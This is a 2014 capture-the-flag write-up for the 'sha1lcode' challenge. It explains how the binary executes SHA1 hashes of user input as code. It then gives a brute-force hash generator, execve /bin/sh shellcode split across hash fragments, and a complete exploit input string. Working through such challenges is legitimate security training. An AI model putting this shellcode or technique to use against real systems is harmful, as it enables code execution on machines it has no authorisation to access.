title: sha1lcode
date: 2014-08-18
author: samuirai
tags: sha1lcode, hitconctf2014

* **Solved by**: samuirai
* **Writeup Author**: samuirai

The name of the challange `sha1lcode` already hints on the overall idea - writing shellcode that has something todo with sha1 hashes.

So let's have a first look at the provided binary file:

    $ file sha1lcode-5b43cc13b0fb249726e0ae175dbef3fe
    sha1lcode-5b43cc13b0fb249726e0ae175dbef3fe: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, not stripped

The following call tree image is generated with `Hopper Dissassembler.app`.

![sha1lcode calltree](data/sha1lcode/sha1_calltree.png)

Hopper can also generate some pseudo C code, which I have cleaned up a little bit and renamed variables:

```C
    function main {
        read(0x0, &input_size, 0x4);
        if (input_size > 0x3e8) {
                rax = exit(0x0);
        }
        else {
                i = 0x0;
                while (input_size*16 > i) {
                        anz_chrs = read(0x0, input_data+i, (input_size*16)-i);
                        i = anz_chrs+i;
                }
                j = 0x0;
                while (j < input_size) {
                         SHA1((j*16) + input_data, 0x10, (j*8 + j*8) + code);
                        j = j + 0x1;
                }
                memset(input_data, 0xffffffff, 0x3e80);
                rax = (code)();
                return 0x0;
        }
        return rax;
    }
```

At the start of the function you can see a `read()` of 4 bytes and a first check afterwards, which would exit the application
if you enter 4 bytes bigger than 0x3e8.
If this is check is passed, the entered value `input_size` is used in the while loop to `read()` more data into `input_data`.
After this loop is completed, `input_data` is hashed in 16 byte chunks with `SHA1()` and written into `code`.
At the end the original input_data is overwritten with `0xffffffff` and the program jumps to the `code` data.

So the data we input in the loop, gets hashed in 16 byte chunks with SHA1 and then we jump to those hashes.
Now it's clear what we have to do - we have to generate SHA1 hashes with valid x86-64 opcodes.

This is a bit of crappy C code to bruteforce hashes with specific values.

    #include <stdio.h>
    #include <string.h>
    #include <openssl/sha.h>

    void gen_random(char *s, const int len) {
        static const char alphanum[] =
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";

        for (int i = 0; i < len; ++i) {
            s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
        }

        s[len] = 0;
    }

    int main()
    {
        int max = 32; // generate max. 32 hashes with the searched values
        unsigned char ibuf[20];
        unsigned char obuf[20];
        for(;;) {
            // get a random string
            gen_random(ibuf, 0x10);

            // hash the random string
            SHA1(ibuf, 0x10, obuf);

            /*
            check if we got a hash with the opcode(s) we want.
            if(obuf[17]==0x48 && obuf[18]==0x09 && obuf[19]==0xcb ) {
            if(obuf[18]==0xb1 && obuf[19]==0x96 ) {
            if(obuf[0]==0xeb && obuf[1]==35 ) {
            */
            if(obuf[0]==0x31 && obuf[1]==0xc0 ) {
                printf("%s sha1(",ibuf);
                for(int i = 0; i < 20; i++) {
                    printf("%02x", obuf[i]);
                }
                printf(")\n");
                if(max--<=0)
                return 0;
            }
        }
        return 0;
    }

Now that we have a little tool to generate hashes with opcodes we have to come up with a general 
idea to fit the shellcode into the hashes:

![sha1lcode opcodes](data/sha1lcode/sha1_opcodes.png)


The program jumps to the start of the first hash and there will be a jump to the *end* of the 2nd hash. At the end of the 2nd
hash starts the shellcode with the first instruction(s). The beginning of the hash afterwards will be another jump the the end of the hash after that.

So generally we have in the beginning of one hash a jump to the end of the next hash, which will contain one or more shellcode opcodes. This way we can execute anything we want...

And this is the shellcode I used:

    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    ;mov rdi, rsp
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    ;mov rsi, rsp
    push rsp
    pop rsi
    mov al, 0x3b
    syscall

The only problem is the length of the opcode. It was fairly fast to bruteforce up to three bytes.
But I had to get the long string `/bin/sh` into the 64bit register and the 10 byte opcode is too
long to bruteforce.

    48BBD19D9691D08C97FF: mov rbx, 0xff978cd091969dd1

So I had to split this up in smaller opcodes:

    mov   bl, 0x97
    mov   bh, 0xff
    shl  ebx, 0x10
    mov   bh, 0x8c
    mov   bl, 0xd0
    shl  rbx, 0x20
    mov   ch, 0x91
    mov   cl, 0x96
    shl  ecx, 0x10
    mov   cl, 0xd1
    mov   ch, 0x9d

Which is almost perfect, but the `shl` in `rbx` still need 4 bytes:

    48C1E310: shl rbx, 0x10

But because 3 bytes can be bruteforced easily and the `jmp` only needs 2 bytes, we can
bruteforce 3 bytes at the end of the one hash, and 3 bytes at the beginning fo the next hash to match
`opcode (4 bytes) + jump (2 bytes) = 6 bytes`

In the end we can split up the shellcode like this:

      original text         opcode in the sha1 hash
    -----------------:------------------------------------
    ikLEsXBe58oJIuFL : (start) jmp 2
    CYOEsiM5zOvynLcZ :   (end) xor eax, eax
    EI6Tlq7y76Vh5hyN : (start) jmp 2
    S61SFzdOBn3zyrBf :   (end) mov bl, 0x97
    EI6Tlq7y76Vh5hyN : (start) jmp 2
    zihgN1OfifVotOPs :   (end) mov bh, 0xff
    qzg3NxCyYGweMVIr : (start) jmp 3
    czbdI1dngWv4nbYv :   (end) shl EBX
    EI6Tlq7y76Vh5hyN : (start) jmp 2
    UqZhIrIoQrZu29qM :   (end) mov bh
    EI6Tlq7y76Vh5hyN : (start) jmp 2
    gMq4RKcD34SOoMpk :   (end) mov bl
    qzg3NxCyYGweMVIr : (start) jmp 3
    j90mqufCQHUY7DFI :   (end) part shl
    BkrI3NqemVnl6iq2 : (start) part shl and jmp 2
    l05Y1tnrwjQGa9GB :   (end) mov ch, 0x91
    EI6Tlq7y76Vh5hyN : (start) jmp 2
    mqKoGcLyK8fi3kSH :   (end) mov cl, 0x96
    qzg3NxCyYGweMVIr : (start) jmp 3
    hVoED3xi4I5kTghS :   (end) shl ECX
    EI6Tlq7y76Vh5hyN : (start) jmp 2
    70hQz3yujDwrWyEi :   (end) mov cl, 0xd1
    EI6Tlq7y76Vh5hyN : (start) jmp 2
    JcGdue7SlbVZ2lpg :   (end) mov ch, 0x9d
    qzg3NxCyYGweMVIr : (start) jmp 3
    XJodA3GFNyfC5mp1 :   (end) or rbx, rcx
    qzg3NxCyYGweMVIr : (start) jmp 3
    CzoXGfRlsiDKfS4H :   (end) neg rbx
    qzg3NxCyYGweMVIr : (start) jmp 3
    fgnxUdbfK3yemOIH :   (end) push rbx, push rsp, pop rdi
    qzg3NxCyYGweMVIr : (start) jmp 3
    taglR8DRWWJmg8Ss :   (end) cdq, push rdx, push rdi
    EI6Tlq7y76Vh5hyN : (start) jmp 2
    ygX8lQIoZ4Ln5EjX :   (end) push rsp, pop rsi
    EI6Tlq7y76Vh5hyN : (start) jmp 2
    9tyObcwpkagTLtEh :   (end) mov al, 0x3b
    EI6Tlq7y76Vh5hyN : (start) jmp 2
    JtZj2STVLXTitmQD :   (end) syscall

The number behind `jmp 2/3` means if it will jump to 2 or 3 bytes before the end of the next hash. Because jumps are done relatively and not absolute it is always the same hash. `qzg3NxCyYGweMVIr == jump to the last 3 bytes of the next hash` and `EI6Tlq7y76Vh5hyN == jump to the last 2 bytes of the next hash`.

Now we can put the full string together, with `\x3a\x00\x00\x00` as prefix to pass the first check, followed by the 16 byte chunks for the sha1 hashes:

    echo "\x3a\x00\x00\x00ikLEsXBe58oJIuFLCYOEsiM5zOvynLcZEI6Tlq7y76Vh5hyNS61SFzdOBn3zyrBfEI6Tlq7y76Vh5hyNzihgN1OfifVotOPsqzg3NxCyYGweMVIrczbdI1dngWv4nbYvEI6Tlq7y76Vh5hyNUqZhIrIoQrZu29qMEI6Tlq7y76Vh5hyNgMq4RKcD34SOoMpkqzg3NxCyYGweMVIrj90mqufCQHUY7DFIBkrI3NqemVnl6iq2l05Y1tnrwjQGa9GBEI6Tlq7y76Vh5hyNmqKoGcLyK8fi3kSHqzg3NxCyYGweMVIrhVoED3xi4I5kTghSEI6Tlq7y76Vh5hyN70hQz3yujDwrWyEiEI6Tlq7y76Vh5hyNJcGdue7SlbVZ2lpgqzg3NxCyYGweMVIrXJodA3GFNyfC5mp1qzg3NxCyYGweMVIrCzoXGfRlsiDKfS4Hqzg3NxCyYGweMVIrfgnxUdbfK3yemOIHqzg3NxCyYGweMVIrtaglR8DRWWJmg8SsEI6Tlq7y76Vh5hyNygX8lQIoZ4Ln5EjXEI6Tlq7y76Vh5hyN9tyObcwpkagTLtEhEI6Tlq7y76Vh5hyNJtZj2STVLXTitmQD`python -c 'print \"A\"*0x3e8'`" > asd


